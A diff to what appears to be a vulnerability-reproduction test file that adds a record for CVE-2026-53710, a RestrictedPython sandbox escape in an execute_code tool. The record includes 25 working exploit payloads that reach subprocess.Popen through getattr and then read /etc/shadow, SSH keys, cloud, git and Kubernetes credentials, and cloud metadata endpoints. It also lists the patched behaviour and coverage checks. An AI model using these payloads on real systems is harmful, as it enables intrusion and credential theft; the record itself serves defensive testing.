@@ -2178,6 +2178,24 @@
       "scope": "CVE-2026-15415",
       "model": "claude-opus-5-5",
       "fallback_model": "claude-opus-4-8"
+    },
+    {
+      "role": "calibrator",
+      "scope": "CVE-2026-53710",
+      "model": "claude-opus-5-5",
+      "fallback_model": "claude-opus-4-8"
+    },
+    {
+      "role": "calibrator",
+      "scope": "CVE-2026-53710",
+      "model": "claude-opus-5-5",
+      "fallback_model": "claude-opus-4-8"
+    },
+    {
+      "role": "card_checker",
+      "scope": "CVE-2026-53710",
+      "model": "claude-opus-5-5",
+      "fallback_model": "claude-opus-4-8"
     }
   ],
   "prefilter": [
@@ -151096,6 +151114,208 @@
         "benign_call": "LintAHOWorkflowBundle(workflow_files={\"main.wdl\": \"version 1.0\\nworkflow w {}\\n\"}, workflow_format=\"wdl\", main_workflow_file=\"main.wdl\")",
         "patched_result": "On 0.0.36 every exploit returns a 'Path traversal detected in main_workflow_file' error and no nonce surfaces; the benign call lints normally and does not error.",
         "attempts": 1
+      },
+      {
+        "flaw": "CVE-2026-53710",
+        "mechanism": "The execute_code tool runs caller-supplied Python under RestrictedPython, but safe_builtins exposes the raw getattr builtin and validate_code rejects dangerous dunder names only as literal substrings. A payload that builds those names at runtime uses getattr to walk the class hierarchy to subprocess.Popen and executes OS commands with the privileges of the server process.",
+        "effect_class": "command_execution",
+        "siblings": [],
+        "kept": [
+          {
+            "place_id": "process-account-identity",
+            "reason": "The flaw runs caller code under the server account, so the escape runs `id`, which prints the account named after this place's nonce; the server does not print its own identity at launch and the benign call (plain arithmetic) does not. Only the command-execution flaw reaches it."
+          },
+          {
+            "place_id": "container-hostname",
+            "reason": "The escape reads /etc/hostname, which carries the launch --hostname nonce; nothing in the launch command or the benign call returns it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "etc-shadow",
+            "reason": "The escape cat-reads /etc/shadow; the server never opens it at launch and the benign call does not reach it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "aws-credentials",
+            "reason": "The escape cat-reads $HOME/.aws/credentials; the server never opens it and the benign call does not. Only the flaw reaches it."
+          },
+          {
+            "place_id": "gcloud-adc",
+            "reason": "The escape cat-reads $HOME/.config/gcloud/application_default_credentials.json; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "azure-profile",
+            "reason": "The escape cat-reads $HOME/.azure/azureProfile.json; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "ssh-private-key",
+            "reason": "The escape cat-reads $HOME/.ssh/id_rsa and id_ed25519; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "shell-history",
+            "reason": "The escape cat-reads $HOME/.bash_history and .zsh_history; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "git-credentials",
+            "reason": "The escape cat-reads $HOME/.git-credentials; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "npmrc",
+            "reason": "The escape cat-reads $HOME/.npmrc; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "gh-hosts",
+            "reason": "The escape cat-reads $HOME/.config/gh/hosts.yml; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "docker-config",
+            "reason": "The escape cat-reads $HOME/.docker/config.json; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "kube-config",
+            "reason": "The escape cat-reads $HOME/.kube/config; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "pgpass",
+            "reason": "The escape cat-reads $HOME/.pgpass; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "mysql-client-cnf",
+            "reason": "The escape cat-reads $HOME/.my.cnf; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "mongorc",
+            "reason": "The escape cat-reads $HOME/.mongorc.js; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "mysql-system-cnf",
+            "reason": "The escape cat-reads /etc/mysql/my.cnf; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "run-secrets",
+            "reason": "The escape cat-reads /run/secrets/db_password; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "k8s-sa-token",
+            "reason": "The escape cat-reads /var/run/secrets/kubernetes.io/serviceaccount/token; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "etc-hosts",
+            "reason": "The escape cat-reads /etc/hosts; the server does not return it and the benign call does not. Only the flaw reaches it."
+          },
+          {
+            "place_id": "auth-log",
+            "reason": "The escape cat-reads /var/log/auth.log and /var/log/secure; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "proc-environ",
+            "reason": "The escape reads the MCP_UPSTREAM_SECRET environment value (printenv); the server reads only its own SANDBOX_* variables and the benign call does not. Only the flaw reaches it."
+          },
+          {
+            "place_id": "imds",
+            "reason": "The escape fetches http://169.254.169.254/latest/meta-data/iam/security-credentials/ and returns the sentinel body; the server makes no outbound request at launch and the benign call does not. Only the flaw reaches it."
+          },
+          {
+            "place_id": "ecs-task-credentials",
+            "reason": "The escape fetches http://169.254.170.2/v2/credentials/ and returns the sentinel body; nothing else reaches it. Only the flaw reaches it."
+          },
+          {
+            "place_id": "eks-pod-identity",
+            "reason": "The escape fetches http://169.254.170.23/v1/credentials and returns the sentinel body; nothing else reaches it. Only the flaw reaches it."
+          }
+        ],
+        "unkept": [
+          {
+            "place_id": "dotenv-file",
+            "reason": "Kind `unplaceable`: the catalogue .env place carries no plantable nonce in the kit (the deployment layout's workspace-dotenv and bare-history-env hold the deployment's own .env instead). Not plantable in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "proc-cmdline",
+            "reason": "Kind `unplaceable`: the server launch command line carries no nonce the fixture may plant, and seeding one would be a forbidden fixture value. Not plantable in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "server-own-source",
+            "reason": "Kind `unplaceable`: seeding a hardcoded secret into the server's own source would both break the seed limits and stop it being the real pinned software; no nonce can be planted. Not plantable in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "server-own-config",
+            "reason": "Kind `unplaceable`: python_sandbox_server keeps no documented config/state file holding an upstream credential or connection string; there is nothing to plant. Not plantable in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "docker-daemon-api",
+            "reason": "Kind `unplaceable`: no Docker daemon socket or TCP endpoint is mounted or reachable on the closed network, so no nonce-bearing endpoint can be planted. Not plantable in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "private-range-service",
+            "reason": "Kind `unplaceable`: no private-range internal service is planted on the closed network, so no nonce can be placed there. Not plantable in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "bare-remote-url",
+            "reason": "layout place: the frozen place table offers it to the arbitrary_read reach only, and this flaw's reach is command_execution, so it is not kept whatever its route",
+            "route_checked": false
+          },
+          {
+            "place_id": "bare-history-env",
+            "reason": "layout place: the frozen place table offers it to the arbitrary_read reach only, and this flaw's reach is command_execution, so it is not kept whatever its route",
+            "route_checked": false
+          },
+          {
+            "place_id": "workspace-dotenv",
+            "reason": "layout place: the frozen place table offers it to the arbitrary_read reach only, and this flaw's reach is command_execution, so it is not kept whatever its route",
+            "route_checked": false
+          },
+          {
+            "place_id": "k8s-api-server",
+            "reason": "Kind `unplaceable`: no Kubernetes API server is planted on the closed network, so no nonce-bearing endpoint can be placed there. Reachable_by is internal_fetch only, outside the command_execution sweep. Not plantable in a container.",
+            "route_checked": null
+          },
+          {
+            "place_id": "loopback-service",
+            "reason": "Kind `unplaceable`: no loopback-bound internal service is planted in the container, so no nonce can be placed there. Reachable_by is internal_fetch only, outside the command_execution sweep. Not plantable in a container.",
+            "route_checked": null
+          }
+        ],
+        "launch_options": [],
+        "seeded_in_layout": [],
+        "seeded_outside_layout": [],
+        "stand_ins": [],
+        "software_releases": [],
+        "fallback_scope": null,
+        "fallback_documentation": null,
+        "exploit_calls": [
+          "[process-account-identity] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['id'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[container-hostname] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['cat', '/etc/hostname'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[etc-shadow] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /etc/shadow 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[aws-credentials] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.aws/credentials 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[gcloud-adc] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.config/gcloud/application_default_credentials.json 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[azure-profile] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.azure/azureProfile.json 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[ssh-private-key] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.ssh/id_rsa /tmp/.ssh/id_ed25519 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[shell-history] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.bash_history /tmp/.zsh_history 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[git-credentials] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.git-credentials 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[npmrc] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.npmrc 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[gh-hosts] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.config/gh/hosts.yml 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[docker-config] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.docker/config.json 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[kube-config] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.kube/config 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[pgpass] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.pgpass 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[mysql-client-cnf] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.my.cnf 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[mongorc] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /tmp/.mongorc.js 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[mysql-system-cnf] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /etc/mysql/my.cnf 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[run-secrets] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /run/secrets/db_password 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[k8s-sa-token] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[etc-hosts] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /etc/hosts 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[auth-log] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['/bin/sh', '-c', 'cat /var/log/auth.log /var/log/secure 2>/dev/null'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[proc-environ] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['printenv', 'MCP_UPSTREAM_SECRET'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[imds] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['python', '-c', \"import sys, urllib.request as u\\nsys.stdout.write(u.urlopen(sys.argv[1], timeout=8).read().decode('utf-8','replace'))\\n\", 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[ecs-task-credentials] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['python', '-c', \"import sys, urllib.request as u\\nsys.stdout.write(u.urlopen(sys.argv[1], timeout=8).read().decode('utf-8','replace'))\\n\", 'http://169.254.170.2/v2/credentials/'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)",
+          "[eks-pod-identity] execute_code(code=<<<\nga = getattr\nsubs = ga(ga((),'__cl'+'ass__'),'__ba'+'se__')\nsubs = ga(subs,'__subcl'+'asses__')()\nP = [c for c in subs if ga(c,'__na'+'me__')=='Popen'][0]\np = P(['python', '-c', \"import sys, urllib.request as u\\nsys.stdout.write(u.urlopen(sys.argv[1], timeout=8).read().decode('utf-8','replace'))\\n\", 'http://169.254.170.23/v1/credentials'], stdout=-1, stderr=-1)\nout = ga(p,'communicate')()[0]\nout\n>>>)"
+        ],
+        "benign_call": "execute_code(code=\"6 * 7\")",
+        "patched_result": "On 1.0.2 every exploit returns a tool result with success=false and error \"name 'getattr' is not defined\" (getattr/setattr removed from safe_builtins and attribute access mediated by _guarded_getattr with an AST pre-check); no nonce surfaces. The benign call returns 42 with no error.",
+        "attempts": 1
       }
     ],
     "card_checks": [
@@ -151335,6 +151555,14 @@
       {
         "flaw": "CVE-2026-15415",
         "reported_gaps": [],
+        "confirmed_gaps": [],
+        "rule_version": 11
+      },
+      {
+        "flaw": "CVE-2026-53710",
+        "reported_gaps": [
+          "Two catalogue places, k8s-api-server and loopback-service (both reachable_by internal_fetch only, kind unplaceable), are absent from the card, neither kept nor unkept, so its place coverage stands at 25 kept plus 9 unkept, 34 of the catalogue's 36. The command-execution reach covers the fetch (the card keeps imds, ecs-task-credentials and eks-pod-identity by it and says so), so the unkept fetch places must be listed too, as the card already lists the other two unplaceable fetch places (docker-daemon-api, private-range-service). Expected: add the two to unkept with their reason (reachable_by internal_fetch only, outside the command_execution sweep, and unplaceable; route_checked null), as the other command_execution cards of the batch do. Detection impact nil: internal_fetch-only and unplaceable places are never kept and bear no planted nonce. An enumeration-exhaustiveness defect, applied at vesting."
+        ],
         "confirmed_gaps": [],
         "rule_version": 11
       }
@@ -152082,7 +152310,8 @@
       "CVE-2026-47394",
       "CVE-2025-65719",
       "CVE-2026-44717",
-      "CVE-2026-15415"
+      "CVE-2026-15415",
+      "CVE-2026-53710"
     ]
   }
 }
